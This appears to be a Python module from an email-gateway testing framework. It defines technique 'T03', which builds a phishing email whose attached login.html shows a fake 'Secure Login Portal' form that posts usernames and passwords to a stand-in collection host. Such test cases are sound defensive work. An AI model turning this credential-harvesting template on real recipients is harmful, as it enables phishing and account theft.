from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.message import Message
from .base import Technique, TechniqueMeta

_HTML_FILE = """<!DOCTYPE html>
<html><head><title>Login</title></head>
<body>
  <h2>Secure Login Portal</h2>
  <form action="http://probe.test.invalid/t03/collect" method="post">
    <input type="text" name="user" placeholder="Username">
    <input type="password" name="pass" placeholder="Password">
    <button type="submit">Log in</button>
  </form>
</body></html>"""


class T03HtmlAttachment(Technique):
    meta = TechniqueMeta(
        id="T03",
        name="HTML attachment (local phishing)",
        threat="Locally-delivered phishing — the attached .html opens in the user's browser, bypassing the gateway when clicked.",
        expected_attachments=["login.html"],
    )

    def build_message(self) -> Message:
        msg = MIMEMultipart()
        msg["Subject"] = "Secure portal access required"
        msg.attach(MIMEText("Open the attached file to access the portal.", "plain", "utf-8"))

        att = MIMEApplication(_HTML_FILE.encode(), _subtype="html")
        att.add_header("Content-Disposition", "attachment", filename="login.html")
        msg.attach(att)
        return msg
